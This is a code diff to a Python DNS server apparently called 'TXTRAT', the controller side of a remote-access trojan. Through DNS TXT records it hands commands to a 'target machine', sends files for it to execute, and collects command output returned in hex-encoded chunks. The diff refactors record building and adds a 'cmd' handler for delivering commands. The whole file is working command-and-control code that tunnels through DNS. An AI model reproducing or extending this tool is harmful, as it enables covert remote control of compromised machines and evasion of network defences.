@@ -1,9 +1,13 @@
-import socket, glob, json
+import socket
+import glob
+import json
 from optparse import OptionParser
 
-out = ''
-size = 0
-file = ''
+out: str = ''
+size: int = 0
+file: str = ''
+command: str = ''
+
 
 def load_zones():
 
@@ -17,7 +21,9 @@ def load_zones():
             jsonzone[zonename] = data
     return jsonzone
 
+
 zonedata = load_zones()
+
 
 def getflags(flags):
 
@@ -92,6 +98,7 @@ def formatout(domain):
 
     return dictreturn
 
+
 def sendfile(domain):
     global file
 
@@ -102,6 +109,7 @@ def sendfile(domain):
     dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': data}]}
 
     return dictreturn
+
 
 def pullchunks(domain):
     global out
@@ -114,6 +122,7 @@ def pullchunks(domain):
 
     return dictreturn
 
+
 def sizefile(domain):
     global size
     sendsize = (int(size/255) + 1)
@@ -121,17 +130,27 @@ def sizefile(domain):
 
     return dictreturn
 
+
+def getcommand(domain):
+    global command
+
+    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': str(command)}]}
+
+    return dictreturn
+
 def cases(domain):
-    command = bytes.fromhex(domain[0]).decode('utf-8')
+    case = bytes.fromhex(domain[0]).decode('utf-8')
 
     options = {
         "end": formatout,
         "file": sendfile,
         "exec": pullchunks,
         "size": sizefile,
+        "cmd": getcommand,
     }
 
-    return options[command](domain)
+    return options[case](domain)
+
 
 def getzone(domain):
     global zonedata
@@ -147,13 +166,18 @@ def getrecs(data):
     qt = ''
     if questiontype == b'\x00\x01':
         qt = 'a'
-
-    if questiontype == b'\x00\x10':
+    elif questiontype == b'\x00\x02':
+        qt = 'ns'
+    elif questiontype == b'\x00\x10':
         qt = 'txt'
+    else:
+        zoneqt = [{'name': '@', 'ttl': 400, 'value': "bad request"}]
+        return zoneqt, 'soa', domain
 
     zone = getzone(domain)
 
     return (zone[qt], qt, domain)
+
 
 def buildquestion(domainname, rectype):
     qbytes = b''
@@ -167,48 +191,51 @@ def buildquestion(domainname, rectype):
 
     if rectype == 'a':
         qbytes += (1).to_bytes(2, byteorder='big')
-
-    if rectype == 'txt':
+    elif rectype == 'ns':
+        qbytes += (2).to_bytes(2, byteorder='big')
+    elif rectype == 'txt':
         qbytes += (16).to_bytes(2, byteorder='big')
+    else:
+        return qbytes
 
     qbytes += (1).to_bytes(2, byteorder='big')
 
     return qbytes
+
 
 def rectobytes(domainname, rectype, recttl, recval):
 
     rbytes = b'\xc0\x0c'
 
     if rectype == 'a':
-        rbytes = rbytes + bytes([0]) + bytes([1])
+        rbytes += bytes([0]) + bytes([1])
+    elif rectype == 'txt':
+        rbytes += bytes([0]) + bytes([16])
+    elif rectype == 'ns':
+        rbytes += bytes([0]) + bytes([2])
+    else:
+        return rbytes
 
-    if rectype == 'txt':
-        rbytes = rbytes + bytes([0]) + bytes([16])
-
-    rbytes = rbytes + bytes([0]) + bytes([1])
+    rbytes += bytes([0]) + bytes([1])
     rbytes += int(recttl).to_bytes(4, byteorder='big')
 
     if rectype == 'a':
-        rbytes = rbytes + bytes([0]) + bytes([4])
+        rbytes += bytes([0]) + bytes([4])
 
         for part in recval.split('.'):
             rbytes += bytes([int(part)])
-
-    if rectype == 'txt':
-        rbytes = rbytes + (len(recval)+1).to_bytes(2, byteorder='big')
-
-        if len(recval) <= 256:
-            rbytes += (len(recval)).to_bytes(1, byteorder='big')
-        else:
-            rbytes += (len(recval)).to_bytes(2, byteorder='big')
-
-
-        rbytes += (recval).encode()
-
-
+    elif rectype == 'ns':
+        rbytes += bytes([0]) + bytes([6])
+        part = recval.split('.')
+        rbytes += (3).to_bytes(1, byteorder='big') + (part[0]).encode() + b'\xc0\x0c'
+    elif rectype == 'txt':
+        rbytes += (len(recval)+1).to_bytes(2, byteorder='big')
+        rbytes += (len(recval)).to_bytes(1, byteorder='big')
+        rbytes += recval.encode()
     return rbytes
 
-def buildresponse(data, command):
+
+def buildresponse(data):
 
     # Transaction ID
     TransactionID = data[:2]
@@ -216,11 +243,14 @@ def buildresponse(data, command):
     # Get the flags
     Flags = getflags(data[2:4])
 
+    # Get answer for query
+    records, rectype, domainname = getrecs(data[12:])
+
     # Question Count
     QDCOUNT = b'\x00\x01'
 
     # Answer Count
-    ANCOUNT = (1).to_bytes(2, byteorder='big')
+    ANCOUNT = (len(records)).to_bytes(2, byteorder='big')
 
     # Nameserver Count
     NSCOUNT = (0).to_bytes(2, byteorder='big')
@@ -233,61 +263,54 @@ def buildresponse(data, command):
     # Create DNS body
     dnsbody = b''
 
-    # Get answer for query
-    records, rectype, domainname = getrecs(data[12:])
-
     dnsquestion = buildquestion(domainname, rectype)
 
+    # start here, test output of records to determine a good default value if we get anything other than txt, a, or ns
+    #if records !=
     for record in records:
-        if rectype == 'a':
-            dnsbody += rectobytes(domainname, rectype, record["ttl"], record["value"])
-        if rectype == 'txt':
-            if len(domainname) > 3:
-                
-                dnsbody += rectobytes(domainname, rectype, record["ttl"], record["value"])	# if I need a unique value for future commands, continue to brance, if not, combine with prior if (if rectype == 'a' && len(domainname) > 3:)
-            else:
-                dnsbody += rectobytes(domainname, rectype, record["ttl"], command)
+        dnsbody += rectobytes(domainname, rectype, record["ttl"], record["value"])
 
     return dnsheader + dnsquestion + dnsbody
+
 
 def main():
     global out
     global size
     global file
+    global command
 
-    usage = "TXTRAT"
     parser = OptionParser()
 
     # IP address
     parser.add_option(
         "-a",
         "--address",
-        help = "IPv4 address to set as listener",
-        action = "store",
-        type = "string",
-        dest = "address",
-        default = '127.0.0.1'
+        help="IPv4 address to set as listener",
+        action="store",
+        type="string",
+        dest="address",
+        default='127.0.0.1'
     )
 
     # Send file
     parser.add_option(
         "-f",
         "--file",
-        help = "Send a file to the target machine. Provide absolute path",
-        action = "store",
-        type = "string",
-        dest = "file",
-        default = "False"
+        help="Send a file to the target machine. Provide absolute path",
+        action="store",
+        type="string",
+        dest="file",
+        default="False"
     )
 
     # Execute file
     parser.add_option(
         "-e",
         "--execute",
-        help = "Execute file assigned to --file option. --file option must be set",
-        action = "store_true",
-        dest = "execute",
-        default = False
+        help="Execute file assigned to --file option. --file option must be set",
+        action="store_true",
+        dest="execute",
+        default=False
     )
 
     (options, args) = parser.parse_args()
@@ -314,7 +337,8 @@ def main():
         out += command + "\n"
         while len(out) != 0:
             data, addr = sock.recvfrom(512)
-            r = buildresponse(data, command)
+            r = buildresponse(data)
             sock.sendto(r, addr)
+
 
 main()
